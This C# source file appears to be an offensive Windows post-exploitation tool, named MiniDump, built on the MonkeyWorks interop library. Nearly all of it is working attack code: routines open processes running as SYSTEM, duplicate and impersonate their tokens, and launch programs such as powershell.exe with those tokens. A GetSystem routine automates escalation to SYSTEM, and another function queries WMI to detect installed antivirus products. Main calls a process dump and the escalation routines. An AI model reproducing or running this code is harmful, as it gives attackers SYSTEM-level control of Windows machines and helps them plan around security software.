using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Management;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;
using System.Linq;

namespace MiniDump
{

    class Token
    {
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);
        protected IntPtr hExistingToken;
        protected IntPtr phNewToken;
        private Dictionary<UInt32, String> processes;

        public static void GetWin32Error(String location)
        {
            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
        }

        protected void FindExe(ref String command, out String arguments)
        {
            arguments = "";
            if (command.Contains(" "))
            {
                String[] commandAndArguments = command.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                command = commandAndArguments.First();
                arguments = String.Join(" ", commandAndArguments.Skip(1).Take(commandAndArguments.Length - 1).ToArray());
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0} ({1})", Process.GetProcessById((int)processId).ProcessName, processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                return false;
            }
            Console.WriteLine(" [+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            kernel32.CloseHandle(hProcess);
            return true;
        }
        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser(Int32 processId)
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();

            Console.WriteLine("[*] Impersonating {0} ({1})", Process.GetProcessById((int)processId).ProcessName, processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: {0} ({1})", Process.GetProcessById((int)processId).ProcessName,
                phNewToken.ToString("X4"));
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetWin32Error("ImpersonateLoggedOnUser: ");
                return false;
            }
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            return true;
        }
        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (IntPtr.Zero != phNewToken)
                kernel32.CloseHandle(phNewToken);
            if (IntPtr.Zero != hExistingToken)
                kernel32.CloseHandle(hExistingToken);
        }
        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {

            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: {0} ({1})", Process.GetProcessById((int)processId).ProcessName, 
                phNewToken.ToString("X4"));

            Create createProcess;
            //If the function fails, the return value is zero. To get extended error information
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            String arguments = String.Empty;
            FindExe(ref newProcess, out arguments);

            if (!createProcess(phNewToken, newProcess, arguments))
            {
                return false;
            }
            return true;
        }
        public Boolean GetSystem(String newProcess)
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Keys)
            {
                if (StartProcessAsUser((Int32)process, newProcess))
                {
                    return true;
                }
            }
            return false;
        }
        public Boolean GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        
        public static bool AntivirusInstalled()
        {

            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                return instances.Count > 0;
            }

            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return false;
        }
        static void Main(string[] args)
        {
            Token test_Token = new Token();
            MiniDump test_Dump = new MiniDump();
            CheckPrivileges test_CheckPrivileges = new CheckPrivileges();

            Console.WriteLine("Dumping Current Process");
            test_Dump.Dump_Process();
            Console.WriteLine("Process Dump Completed!");

            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            // bool ret = test_Token.ImpersonateUser(836);
            // bool ret = test_Token.StartProcessAsUser(836, "powershell.exe");
            // bool ret = test_Token.GetSystem();
           // bool ret = test_Token.GetSystem("powershell.exe");
            test_Token.Dispose();
           // Console.WriteLine(ret.ToString());
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);

            test_CheckPrivileges.GetSystem();

            bool av = AntivirusInstalled();
            Console.WriteLine(av.ToString());
            Console.ReadKey();
        }
    }
}
